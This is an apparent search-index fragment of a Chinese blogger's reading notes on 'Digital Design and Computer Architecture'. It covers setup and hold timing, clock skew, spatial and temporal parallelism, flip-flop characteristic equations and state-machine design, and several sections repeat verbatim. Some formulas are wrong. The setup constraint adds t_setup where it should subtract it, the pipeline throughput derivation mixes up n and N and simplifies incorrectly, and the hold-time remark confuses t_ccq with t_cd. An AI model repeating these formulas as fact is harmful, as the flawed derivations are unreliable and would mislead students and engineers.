Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#355-synchronizers"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#356-derivation-of-resolution-time"},{"categories":["计算机体系结构"],"content":" 3.6 3.6 Parallelism 参考了课程官方讲解视频： 此节有几个重要概念： 延迟（latency）：完成一项工作所花费的时间 吞吐量（throughoutput）：单位时间内完成工作的量 为了提高吞吐率，我们可以采用并行（parallelism）的方式，parallelism有两种： spatial parallelism：复制硬件 temporal parallelism：将工作拆分为多个阶段，不同的工作可能处于不同的阶段中，即流水线 量化分析，假设如下场景： 一个任务的延迟是L（完成一项任务所花费的时间是L） 它的吞吐量是1/L（在单位时间内完成的工作量是1/L） 对于spatial parallelism的系统，假设硬件复制了N份，那么： 任务的延迟依然是L 它的吞吐量是N/L（同一时刻有N份硬件完成该任务） 对于temporal parallelism的系统，假设把他划分为N个阶段，那么： 任务的延迟依然是L 对于流水线，第一个任务完成所需要的时间是L，自那以后每过L/N个单位的时间，就有一项任务完成。对于$n$个任务来说，完成所需要的总时间是$L+(N-1)\\frac{L}{N}$，那么它的吞吐量就是$\\frac{n}{L+(N-1)(\\frac{L}{N})}$，对该式进行化简，过程如下： $$ \\frac{n}{L+(N-1)*(\\frac{L}{N})} = \\frac{n}{2L-\\frac{L}{N}} $$ 对于流水线来说，其一个阶段的时钟周期，取决于这个阶段中关键路径所花的时间（也就是从上个寄存器到下个寄存器，通过最长时间的路径）；其延迟是指从流水线开头到流水线结尾所花费的时间；其吞吐量可以约等于$\\frac{1}{时钟周期}$ temporal parallelism和spatial parallelism相比，其优势在于其可以通过不增加硬件达到加倍的吞吐量。 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:6","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#36-parallelism"},{"categories":["计算机体系结构"],"content":" 3.7 3.7 Summary本章介绍了： 时序逻辑电路和组合逻辑电路的区别 多种锁存器 -\u003e 多种触发器 -\u003e 使能触发器和复位触发器 从状态转换图到时序逻辑电路的设计 时序逻辑电路的时序分析 多种parallelism：spatial parallelism和temporal parallelism的延迟和吞吐量 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:7","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#37-summary"},{"categories":["计算机体系结构"],"content":" 3.8 Exercises 触发器的转换方法参考链接各类触发器的转换-数字电子技术-电子发烧友网站 (elecfans.com) 3.8.1 基础的锁存器 \u0026 触发器特性 SR锁存器 S为set，S=1时，输出信号为1 R为reset，R=1时，输出信号为0 SR=1时，电路状态无效 SR=0时，电路状态保持不变 D锁存器 CLK=1时，输出Q=D CLK=0时，输出保持不变 D触发器 CLK上升沿把D的值输入到Q 其他时候输出保持不变 3.8.2 各类触发器之间的互相转换没有在课本中提到的是一些其他的触发器，以及触发器的特性方程，而触发器之间的互相转换需要利用到特性方程。特性方程指的是锁存器/触发器的下一时刻输出$Q*$与输入信号之间的关系。 RS触发器：输入信号R和S，输出为Q*。特性方程为$Q^{*}=S+\\bar{R}Q$ D触发器：输入信号D和CLK，输出为Q*。特性方程为$Q^{*} = D$ JK触发器：功能最强大 JK都为0，保持输入 J=1，输出为1 K=1，输出为0 JK都为1，输出取前一个时刻输出的取反 输入信号为J和K，输出为$Q^{}$，特性方程为$Q^{}=J\\bar{Q}+\\bar{K}Q$ T触发器： 功能是每个时钟上升沿，输出为前一个时刻输出的取反。输入信号为T和CLK，输出为Q*； 特性方程为$Q^{*}=\\bar{T}Q+T\\bar{Q}$ 各个触发器的状态转换的方法在于，用已知的触发器去表达未知的触发器，如下： D触发器 -\u003e T触发器（用T表示D）：$D=\\bar{T}Q+T\\bar{Q}$ D触发器 -\u003e JK触发器（用JK表示D）：$D=J\\bar{Q}+\\bar{K}Q$ JK触发器 -\u003e D触发器（用D表示JK）： 可以将D转化为$Q^{*}=D(Q+\\bar{Q})=DQ+D\\bar{Q}$ 因为JK触发器特性方程为$Q^{*}=J\\bar{Q}+\\bar{K}Q$ 那么$J=D,K=\\bar{D}$ JK触发器 -\u003e T触发器（用T表示JK）： JK触发器：$Q^{*}=J\\bar{Q}+\\bar{K}Q$ T触发器：$D=\\bar{T}Q+T\\bar{Q}$ 那么$J=T,K=T$ 3.8.3 同步电路 vs 异步电路 异步 preset \u0026 clear电路的工作时序可以参考这个油管视频： preset \u0026 clear latch/flip-flop的设计可以参考这个油管视频： 以及这个油管视频： 查找异步视频资料的时候还费了点功夫，一开始搜索的是asynchronous d latch/flip flop/sequential circuit design，结果搜到的资料非常有限，直到搜到一本sequential circuit design还是什么教材，里面管这个特性叫preset \u0026 clear，才恍然大悟查错了资料。后来换了个方式查找资料，果然搜到了。 异步复位的D锁存器设计 异步设置D锁存器设计 异步复位的D触发器设计 异步设置D触发器设计 3.8.4 时序逻辑电路的设计：从状态机到电路（尤其是Mealy型电路的设计） Moore型电路和Mealy型电路的主要差别在于：Moore型电路的输出与状态有关，而Mealy型电路的输出与状态和输入有关。 Mealy型电路的设计还不太会（如课本P166 习题3.25）(说白了其实是DFA的设计不太会，过会儿补一补） DFA的介绍看这里： 3.8.4.1 状态机的化简流程 状态机的化简看这里： 化简流程： 根据状态转换图，画出状态转换表 消去等效状态 把表中消去的等效状态用已有的状态替代 画出新的状态转换图 3.8.4.2 二进制序列检测器 基础二进制序列检测器的实现方法看这里： 3.8.4.3 Grey Code状态机生成器 3.8.5 时序逻辑电路的分析：从电路到状态机 3.8.6 时序逻辑电路中的限制与延迟","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:8","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#exercises"},{"categories":["计算机体系结构"],"content":" 3.8 Exercises 触发器的转换方法参考链接各类触发器的转换-数字电子技术-电子发烧友网站 (elecfans.com) 3.8.1 基础的锁存器 \u0026 触发器特性 SR锁存器 S为set，S=1时，输出信号为1 R为reset，R=1时，输出信号为0 SR=1时，电路状态无效 SR=0时，电路状态保持不变 D锁存器 CLK=1时，输出Q=D CLK=0时，输出保持不变 D触发器 CLK上升沿把D的值输入到Q 其他时候输出保持不变 3.8.2 各类触发器之间的互相转换没有在课本中提到的是一些其他的触发器，以及触发器的特性方程，而触发器之间的互相转换需要利用到特性方程。特性方程指的是锁存器/触发器的下一时刻输出$Q*$与输入信号之间的关系。 RS触发器：输入信号R和S，输出为Q*。特性方程为$Q^{*}=S+\\bar{R}Q$ D触发器：输入信号D和CLK，输出为Q*。特性方程为$Q^{*} = D$ JK触发器：功能最强大 JK都为0，保持输入 J=1，输出为1 K=1，输出为0 JK都为1，输出取前一个时刻输出的取反 输入信号为J和K，输出为$Q^{}$，特性方程为$Q^{}=J\\bar{Q}+\\bar{K}Q$ T触发器： 功能是每个时钟上升沿，输出为前一个时刻输出的取反。输入信号为T和CLK，输出为Q*； 特性方程为$Q^{*}=\\bar{T}Q+T\\bar{Q}$ 各个触发器的状态转换的方法在于，用已知的触发器去表达未知的触发器，如下： D触发器 -\u003e T触发器（用T表示D）：$D=\\bar{T}Q+T\\bar{Q}$ D触发器 -\u003e JK触发器（用JK表示D）：$D=J\\bar{Q}+\\bar{K}Q$ JK触发器 -\u003e D触发器（用D表示JK）： 可以将D转化为$Q^{*}=D(Q+\\bar{Q})=DQ+D\\bar{Q}$ 因为JK触发器特性方程为$Q^{*}=J\\bar{Q}+\\bar{K}Q$ 那么$J=D,K=\\bar{D}$ JK触发器 -\u003e T触发器（用T表示JK）： JK触发器：$Q^{*}=J\\bar{Q}+\\bar{K}Q$ T触发器：$D=\\bar{T}Q+T\\bar{Q}$ 那么$J=T,K=T$ 3.8.3 同步电路 vs 异步电路 异步 preset \u0026 clear电路的工作时序可以参考这个油管视频： preset \u0026 clear latch/flip-flop的设计可以参考这个油管视频： 以及这个油管视频： 查找异步视频资料的时候还费了点功夫，一开始搜索的是asynchronous d latch/flip flop/sequential circuit design，结果搜到的资料非常有限，直到搜到一本sequential circuit design还是什么教材，里面管这个特性叫preset \u0026 clear，才恍然大悟查错了资料。后来换了个方式查找资料，果然搜到了。 异步复位的D锁存器设计 异步设置D锁存器设计 异步复位的D触发器设计 异步设置D触发器设计 3.8.4 时序逻辑电路的设计：从状态机到电路（尤其是Mealy型电路的设计） Moore型电路和Mealy型电路的主要差别在于：Moore型电路的输出与状态有关，而Mealy型电路的输出与状态和输入有关。 Mealy型电路的设计还不太会（如课本P166 习题3.25）(说白了其实是DFA的设计不太会，过会儿补一补） DFA的介绍看这里： 3.8.4.1 状态机的化简流程 状态机的化简看这里： 化简流程： 根据状态转换图，画出状态转换表 消去等效状态 把表中消去的等效状态用已有的状态替代 画出新的状态转换图 3.8.4.2 二进制序列检测器 基础二进制序列检测器的实现方法看这里： 3.8.4.3 Grey Code状态机生成器 3.8.5 时序逻辑电路的分析：从电路到状态机 3.8.6 时序逻辑电路中的限制与延迟","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:8","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#基础的锁存器--触发器特性"},{"categories":["计算机体系结构"],"content":" 3.8 Exercises 触发器的转换方法参考链接各类触发器的转换-数字电子技术-电子发烧友网站 (elecfans.com) 3.8.1 基础的锁存器 \u0026 触发器特性 SR锁存器 S为set，S=1时，输出信号为1 R为reset，R=1时，输出信号为0 SR=1时，电路状态无效 SR=0时，电路状态保持不变 D锁存器 CLK=1时，输出Q=D CLK=0时，输出保持不变 D触发器 CLK上升沿把D的值输入到Q 其他时候输出保持不变 3.8.2 各类触发器之间的互相转换没有在课本中提到的是一些其他的触发器，以及触发器的特性方程，而触发器之间的互相转换需要利用到特性方程。特性方程指的是锁存器/触发器的下一时刻输出$Q*$与输入信号之间的关系。 RS触发器：输入信号R和S，输出为Q*。特性方程为$Q^{*}=S+\\bar{R}Q$ D触发器：输入信号D和CLK，输出为Q*。特性方程为$Q^{*} = D$ JK触发器：功能最强大 JK都为0，保持输入 J=1，输出为1 K=1，输出为0 JK都为1，输出取前一个时刻输出的取反 输入信号为J和K，输出为$Q^{}$，特性方程为$Q^{}=J\\bar{Q}+\\bar{K}Q$ T触发器： 功能是每个时钟上升沿，输出为前一个时刻输出的取反。输入信号为T和CLK，输出为Q*； 特性方程为$Q^{*}=\\bar{T}Q+T\\bar{Q}$ 各个触发器的状态转换的方法在于，用已知的触发器去表达未知的触发器，如下： D触发器 -\u003e T触发器（用T表示D）：$D=\\bar{T}Q+T\\bar{Q}$ D触发器 -\u003e JK触发器（用JK表示D）：$D=J\\bar{Q}+\\bar{K}Q$ JK触发器 -\u003e D触发器（用D表示JK）： 可以将D转化为$Q^{*}=D(Q+\\bar{Q})=DQ+D\\bar{Q}$ 因为JK触发器特性方程为$Q^{*}=J\\bar{Q}+\\bar{K}Q$ 那么$J=D,K=\\bar{D}$ JK触发器 -\u003e T触发器（用T表示JK）： JK触发器：$Q^{*}=J\\bar{Q}+\\bar{K}Q$ T触发器：$D=\\bar{T}Q+T\\bar{Q}$ 那么$J=T,K=T$ 3.8.3 同步电路 vs 异步电路 异步 preset \u0026 clear电路的工作时序可以参考这个油管视频： preset \u0026 clear latch/flip-flop的设计可以参考这个油管视频： 以及这个油管视频： 查找异步视频资料的时候还费了点功夫，一开始搜索的是asynchronous d latch/flip flop/sequential circuit design，结果搜到的资料非常有限，直到搜到一本sequential circuit design还是什么教材，里面管这个特性叫preset \u0026 clear，才恍然大悟查错了资料。后来换了个方式查找资料，果然搜到了。 异步复位的D锁存器设计 异步设置D锁存器设计 异步复位的D触发器设计 异步设置D触发器设计 3.8.4 时序逻辑电路的设计：从状态机到电路（尤其是Mealy型电路的设计） Moore型电路和Mealy型电路的主要差别在于：Moore型电路的输出与状态有关，而Mealy型电路的输出与状态和输入有关。 Mealy型电路的设计还不太会（如课本P166 习题3.25）(说白了其实是DFA的设计不太会，过会儿补一补） DFA的介绍看这里： 3.8.4.1 状态机的化简流程 状态机的化简看这里： 化简流程： 根据状态转换图，画出状态转换表 消去等效状态 把表中消去的等效状态用已有的状态替代 画出新的状态转换图 3.8.4.2 二进制序列检测器 基础二进制序列检测器的实现方法看这里： 3.8.4.3 Grey Code状态机生成器 3.8.5 时序逻辑电路的分析：从电路到状态机 3.8.6 时序逻辑电路中的限制与延迟","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:8","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#各类触发器之间的互相转换"},{"categories":["计算机体系结构"],"content":" 3.8 Exercises 触发器的转换方法参考链接各类触发器的转换-数字电子技术-电子发烧友网站 (elecfans.com) 3.8.1 基础的锁存器 \u0026 触发器特性 SR锁存器 S为set，S=1时，输出信号为1 R为reset，R=1时，输出信号为0 SR=1时，电路状态无效 SR=0时，电路状态保持不变 D锁存器 CLK=1时，输出Q=D CLK=0时，输出保持不变 D触发器 CLK上升沿把D的值输入到Q 其他时候输出保持不变 3.8.2 各类触发器之间的互相转换没有在课本中提到的是一些其他的触发器，以及触发器的特性方程，而触发器之间的互相转换需要利用到特性方程。特性方程指的是锁存器/触发器的下一时刻输出$Q*$与输入信号之间的关系。 RS触发器：输入信号R和S，输出为Q*。特性方程为$Q^{*}=S+\\bar{R}Q$ D触发器：输入信号D和CLK，输出为Q*。特性方程为$Q^{*} = D$ JK触发器：功能最强大 JK都为0，保持输入 J=1，输出为1 K=1，输出为0 JK都为1，输出取前一个时刻输出的取反 输入信号为J和K，输出为$Q^{}$，特性方程为$Q^{}=J\\bar{Q}+\\bar{K}Q$ T触发器： 功能是每个时钟上升沿，输出为前一个时刻输出的取反。输入信号为T和CLK，输出为Q*； 特性方程为$Q^{*}=\\bar{T}Q+T\\bar{Q}$ 各个触发器的状态转换的方法在于，用已知的触发器去表达未知的触发器，如下： D触发器 -\u003e T触发器（用T表示D）：$D=\\bar{T}Q+T\\bar{Q}$ D触发器 -\u003e JK触发器（用JK表示D）：$D=J\\bar{Q}+\\bar{K}Q$ JK触发器 -\u003e D触发器（用D表示JK）： 可以将D转化为$Q^{*}=D(Q+\\bar{Q})=DQ+D\\bar{Q}$ 因为JK触发器特性方程为$Q^{*}=J\\bar{Q}+\\bar{K}Q$ 那么$J=D,K=\\bar{D}$ JK触发器 -\u003e T触发器（用T表示JK）： JK触发器：$Q^{*}=J\\bar{Q}+\\bar{K}Q$ T触发器：$D=\\bar{T}Q+T\\bar{Q}$ 那么$J=T,K=T$ 3.8.3 同步电路 vs 异步电路 异步 preset \u0026 clear电路的工作时序可以参考这个油管视频： preset \u0026 clear latch/flip-flop的设计可以参考这个油管视频： 以及这个油管视频： 查找异步视频资料的时候还费了点功夫，一开始搜索的是asynchronous d latch/flip flop/sequential circuit design，结果搜到的资料非常有限，直到搜到一本sequential circuit design还是什么教材，里面管这个特性叫preset \u0026 clear，才恍然大悟查错了资料。后来换了个方式查找资料，果然搜到了。 异步复位的D锁存器设计 异步设置D锁存器设计 异步复位的D触发器设计 异步设置D触发器设计 3.8.4 时序逻辑电路的设计：从状态机到电路（尤其是Mealy型电路的设计） Moore型电路和Mealy型电路的主要差别在于：Moore型电路的输出与状态有关，而Mealy型电路的输出与状态和输入有关。 Mealy型电路的设计还不太会（如课本P166 习题3.25）(说白了其实是DFA的设计不太会，过会儿补一补） DFA的介绍看这里： 3.8.4.1 状态机的化简流程 状态机的化简看这里： 化简流程： 根据状态转换图，画出状态转换表 消去等效状态 把表中消去的等效状态用已有的状态替代 画出新的状态转换图 3.8.4.2 二进制序列检测器 基础二进制序列检测器的实现方法看这里： 3.8.4.3 Grey Code状态机生成器 3.8.5 时序逻辑电路的分析：从电路到状态机 3.8.6 